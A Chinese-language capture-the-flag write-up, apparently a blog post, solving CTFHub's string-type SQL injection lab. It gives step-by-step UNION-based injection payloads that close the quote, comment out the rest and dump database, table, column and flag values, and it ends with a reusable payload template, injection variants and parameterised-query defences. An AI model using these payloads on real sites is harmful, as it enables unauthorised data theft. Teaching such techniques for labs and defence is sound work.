---
layout: post
title: CTFHub - SQL 字符型注入 Writeup
platform: ctfhub
date: 2026-10-19 17:42:00 +0800
categories: CTF
---

CTFHub - SQL 字符型注入 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **SQL 注入** → 字符型注入）
- 题型：Web
- 考点：**单引号闭合**、**注释符 `#`**、UNION 联合查询


```text
页面标题：CTFHub 技能学习 | 字符型注入
表单：GET 请求，参数名 id，占位提示"输个1试试？"

★ 和整数型的关键区别 —— 看页面回显的 SQL：

    整数型：  select * from news where id=1
                                        └┬┘
                                   数字，没有引号

    字符型：  select * from news where id='1'      ← ★ 被单引号包起来了
                                        └─┬─┘

id=1 的响应：
    ID: 1
    Data: ctfhub

★ 直接输 `1 order by 3` 没有任何效果（关键现象）：
    SQL 变成：select * from news where id='1 order by 3'
                                       └──────┬──────┘
                                  整段被当成【字符串】，不是 SQL 代码
    响应：ID: 1  Data: ctfhub        ← 不报错，但 order by 也没执行

★ 加上单引号闭合 + # 注释后，注入成功：

    1' order by 1 #   →  ID: 1  Data: ctfhub
    1' order by 2 #   →  ID: 1  Data: ctfhub
    1' order by 3 #   →  （空白）← 第 3 列不存在
    → 字段数 = 2

    0' union select 1,2 #           →  ID: 1  Data: 2
    0' union select 1,database() #  →  Data: sqli

    0' union select 1,group_concat(table_name)
         from information_schema.tables
         where table_schema=database() #
    →  Data: flag,news

    0' union select 1,group_concat(column_name)
         from information_schema.columns
         where table_name='flag' #
    →  Data: flag

    0' union select 1,group_concat(flag) from flag #
    →  Data: ctfhub{...}

flag         : ctfhub{...}（每个环境不同，用你自己跑出来的）
```

二、题目分析

**① 字符型和整数型的根本区别**

```text
后台 PHP 代码（字符型）：
    $sql = "select * from news where id='$id'";
                                     └┬┘   └┬┘
                                 左引号    右引号
                              ★ 程序自己加了一对引号

所以你传 id=1，实际执行的是：
    select * from news where id='1'
                              └─┬─┘
                         1 变成了【字符串】，不是数字
```

**这个差别带来一个致命后果**：

```text
你传 id=1 order by 3
    → select * from news where id='1 order by 3'
                                  └──────────┬──────────┘
                              这一整段是一个字符串值！
                              
    MySQL 认为你在"查 id 等于 '1 order by 3' 的记录"
    → 查不到（当然查不到）
    → 但【order by 不会被执行】，因为它只是字符串内容

★ 字符串里的 SQL 关键字【不会执行】
```

**② 破局思路：闭合引号 + 注释掉多余部分**

```text
要想让 order by 生效，必须让字符串【提前结束】：

目标：  select * from news where id='1' order by 3
                                    └─┬─┘
                                字符串在这里结束了

做法：在你的输入里手动加一个单引号 '

    输入：1' order by 3
    拼成：select * from news where id='1' order by 3'
                                 └─┬─┘
                            引号配对了！字符串 = "1"
                            后面 order by 3 成了 SQL 代码 ✅

但是！还有个问题：结尾那个程序写的 ' 变成了孤立的引号
    → select * from news where id='1' order by 3'
                                                └┬┘
                                          语法错误（引号不配对）

解决：用注释符把后面全砍掉

    输入：1' order by 3 #
    拼成：select * from news where id='1' order by 3 #'
                                                └┬┘
                                         被注释掉了 ✅
```

**③ 两个关键符号**

| 符号 | 作用 | 说明 |
|---|---|---|
| `'` | **闭合**程序写的左引号 | 让字符串提前结束，后续内容变成 SQL 代码 |
| `#` | **注释**掉后面所有内容 | 包括程序原本写的那个右引号 |

**等价写法**：`#` 也可以用 `-- `（两个横线 + 一个空格）代替。

**④ ⚠️ 最容易踩的坑：`#` 在 URL 里会消失**

```text
HTML 里 # 是"锚点"标记（比如 page.html#section2）

如果你在【浏览器地址栏】直接输入：
    ?id=1' order by 3 #
                     └┬┘
        浏览器认为这是锚点，不发给服务器！
        → 服务器收到的是 ?id=1' order by 3
        → 报错/没反应

✅ 两种解决办法：

    A. 用页面上的【ID 输入框】输入（推荐）
       表单提交时浏览器会自动把 # 编码成 %23

    B. 在地址栏里手动写编码：
       ?id=1%27%20order%20by%203%20%23
              └┬┘              └┬┘
            ' 的编码         # 的编码
```

**⑤ URL 编码速查**

| 字符 | URL 编码 | 用途 |
|---|---|---|
| `'` | `%27` | 闭合引号 |
| `#` | `%23` | 注释 |
| 空格 | `%20` 或 `+` | 分隔关键字 |
| `-- ` | `--%20` | 另一种注释（注意后面要有空格）|

三、解题步骤

**准备**：所有 payload 都填在页面上的 **ID 输入框**里，然后点 Search。

**第 1 步：确认注入点**

```
ID 框输入：1
→ 显示：ID: 1  Data: ctfhub

看页面回显的 SQL：
    select * from news where id='1'
                            └─┬─┘
                       ★ 有单引号 → 字符型注入
```

**第 2 步：验证"不闭合引号就没效果"**

```
ID 框输入：1 order by 3
→ 显示：ID: 1  Data: ctfhub      （还是有结果！）

看 SQL：
    select * from news where id='1 order by 3'
                                  └──────┬──────┘
                              整段是字符串，order by 没执行
```

**这一步很重要** —— 它证明了"必须闭合引号"。

**第 3 步：闭合引号，测字段数**

```
ID 框输入：1' order by 1 #
→ 显示：ID: 1  Data: ctfhub       ✅ 第 1 列存在

ID 框输入：1' order by 2 #
→ 显示：ID: 1  Data: ctfhub       ✅ 第 2 列存在

ID 框输入：1' order by 3 #
→ 显示：（空白）                    ❌ 第 3 列不存在
```

**看 SQL 回显确认闭合成功**：

```sql
select * from news where id='1' order by 3 #'
                            └─┬─┘          └┬┘
                        引号配对         多余引号被注释
```

**结论：字段数 = 2**

**第 4 步：确认能控制输出**

```
ID 框输入：0' union select 1,2 #
→ 显示：ID: 1  Data: 2
```

**看到 `1` 和 `2` 就说明：页面显示的是你造的假数据，不是表里真实数据。**

**第 5 步：爆库名**

```
ID 框输入：0' union select 1,database() #
→ 显示：Data: sqli
```

**第 6 步：爆表名**

```
ID 框输入：
0' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #

→ 显示：Data: flag,news
```

**第 7 步：爆字段名**

```
ID 框输入：
0' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' #

→ 显示：Data: flag
```

> ⚠️ **这条有 3 个单引号，别搞混**：
> - `0'` 开头的 → 闭合程序引号
> - `'flag'` 两边 → 表示字符串

**第 8 步：拿 flag**

```
ID 框输入：
0' union select 1,group_concat(flag) from flag #

→ 显示：Data: ctfhub{...}        🎉
```

**提交到 CTFHub → 通关**

---

**用工具一键跑（我写的脚本，支持字符型）**

```text
双击 sqli-union.bat
→ 粘贴地址：http://challenge-xxx:10800/?id=1
→ 问"是否字符型"时回答：Y
→ 自动完成 7 个阶段
```

**工具会自动加 `'` 和 `#`**（对应代码里的 `--quote` 参数）。

四、延伸知识

**① 整数型 vs 字符型 完整对照**

| | 整数型 | 字符型 |
|---|---|---|
| 后台 SQL | `where id=1` | `where id='1'` |
| 直接注入 | ✅ 可以 | ❌ 不行（被当字符串）|
| 开头 | `0 union select ...` | **`0' union select ...`** |
| 结尾 | （不需要） | **` #`** |
| 判断依据 | 页面回显 SQL 里没有引号 | 页面回显 SQL 里有引号 |

**记忆口诀**：

```
整数型：直接接
字符型：先闭合，再注释
        '  ...  #
```

**② 为什么要用 `0` 而不是 `1`**

```sql
-- 用 1（前半句查到数据，你的结果被挤到第二行，页面只显示第一行）
0 → 1' union select 1,database() #
    → select * from news where id='1' union select 1,database() #'
    → 结果集：[(1, ctfhub), (1, sqli)]
    → 页面只打印第一行 → 看不到 sqli

-- 用 0（前半句查不到，你的结果就是第一行）
    → select * from news where id='0' union select 1,database() #'
    → 结果集：[(1, sqli)]
    → 页面打印 → 看到 sqli ✅
```

**③ 注释符的多种写法**

```sql
#            ← MySQL 特有，最常用
--           ← 标准 SQL，但【后面必须跟一个空格】
--  （两个横线+空格）
/*  */       ← 块注释，也可以用来截断
```

**在 URL 里的编码**：

```
#         → %23
--        → -- （横线不用编码），后面的空格 → %20
/*        → /*（一般不用编码）
```

**④ 字符型注入的常见变体（后面的题会用到）**

```text
· 单引号 '      ← 本题
· 双引号 "      —— 有些代码用双引号包裹
· 括号 ()       —— where id=('1')
· 需要同时闭合多个：') or 1=1 -- 
· 转义被过滤（宽字节注入 %df'）
```

**⑤ 防护**

```text
· ★ 参数化查询（预处理语句）—— 根本解决办法
      $stmt = $pdo->prepare("select * from news where id=?");
      $stmt->execute([$id]);
      → 用户输入永远是"数据"，不会变成"代码"
      引号自动处理，不用担心闭合问题

· 输入校验：id 必须是纯数字 → (int)$id 强制转换
· 关闭错误回显（display_errors=Off）
· 最小权限数据库账号
```

五、总结

- **本题核心：字符型注入要先用 `'` 闭合程序写的引号，再用 `#` 注释掉多余的引号。**
- 完整 payload 模板：

```sql
-- 第 1 步：测字段数
1' order by 1 #        （逐次加数字，报错的前一个就是字段数）

-- 第 2 步：确认回显
0' union select 1,2 #

-- 第 3 步：爆库名
0' union select 1,database() #

-- 第 4 步：爆表名
0' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #

-- 第 5 步：爆字段名
0' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' #

-- 第 6 步：拿数据
0' union select 1,group_concat(flag) from flag #
```

- **三个必记要点**：

```text
① 判断类型：看页面回显的 SQL 里有没有引号
② 字符型必须：开头加 ' 闭合，结尾加 # 注释
③ ★ # 在浏览器地址栏里会被当成锚点吃掉 —— 用输入框，或手写 %23
```


